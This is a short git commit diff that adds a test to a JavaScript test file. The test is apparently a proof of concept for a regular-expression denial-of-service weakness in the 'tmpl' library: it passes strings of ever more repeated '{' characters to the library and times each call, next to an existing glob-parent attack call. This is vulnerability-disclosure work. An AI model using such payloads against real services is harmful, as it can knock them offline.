d46d98bb22ee4fef2020d4247399bdc498decd7b
torbeerandom <tor@legitsecurity.com>
2022-02-03 16:18:17 +0200

    added cve ddos huntr

--- __test__/game.test.js
+++ __test__/game.test.js
@@ -5,10 +5,17 @@ function buildAttack (n) {
   }
   return ret
 }
-
+const tmpl = require('tmpl')
 const globParent = require('glob-parent')
 describe('App', () => {
   it('Contains the compiled JavaScript', async () => {
+    for(var i = 1; i <= 50000; i++) {
+       var time = Date.now();
+       var attack_str = ''+'{'.repeat(i*10000)+'answer';
+        tmpl(attack_str, { answer: 42 })
+       var time_cost = Date.now() - time;
+       console.log('attack_str.length: ' + attack_str.length + ': ' + time_cost+' ms')
+    }
     globParent(buildAttack(5000))
     const data = 'data'
     expect(data).toBe('data')
